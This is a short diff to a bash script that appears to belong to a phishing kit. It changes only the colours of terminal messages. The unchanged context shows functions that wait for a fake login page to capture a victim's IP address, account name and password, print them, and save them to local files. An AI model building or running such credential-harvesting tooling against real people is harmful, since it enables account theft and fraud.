@@ -414,8 +414,8 @@ setup_site() {
 capture_ip() {
 	IP=$(awk -F'IP: ' '{print $2}' .server/www/ip.txt | xargs)
 	IFS=$'\n'
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Victim's IP : ${BLUE}$IP"
-	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/ip.txt"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Victim's IP : ${WHITE}$IP"
+	echo -ne "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${WHITE}auth/ip.txt"
 	cat .server/www/ip.txt >> auth/ip.txt
 }
 
@@ -426,7 +426,7 @@ capture_creds() {
 	IFS=$'\n'
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Account : ${BLUE}$ACCOUNT"
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Password : ${BLUE}$PASSWORD"
-	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${ORANGE}auth/usernames.dat"
+	echo -e "\n${RED}[${WHITE}-${RED}]${BLUE} Saved in : ${WHITE}auth/usernames.dat"
 	cat .server/www/usernames.txt >> auth/usernames.dat
 	echo -ne "\n${RED}[${WHITE}-${RED}]${WHITE} Waiting for Next Login Info, ${BLUE}Ctrl + C ${WHITE}to exit. "
 }
@@ -436,13 +436,13 @@ capture_data() {
 	echo -ne "\n${RED}[${WHITE}-${RED}]${WHITE} Waiting for Login Info, ${BLUE}Ctrl + C ${WHITE}to exit..."
 	while true; do
 		if [[ -e ".server/www/ip.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Victim IP Found !"
+			echo -e "\n\n${RED}[${WHITE}-${RED}][38;2;0;255;170m Victim IP Found !"
 			capture_ip
 			rm -rf .server/www/ip.txt
 		fi
 		sleep 0.75
 		if [[ -e ".server/www/usernames.txt" ]]; then
-			echo -e "\n\n${RED}[${WHITE}-${RED}]${GREEN} Login info Found !!"
+			echo -e "\n\n${RED}[${WHITE}-${RED}][38;2;0;255;170m Login info Found !!"
 			capture_creds
 			rm -rf .server/www/usernames.txt
 		fi
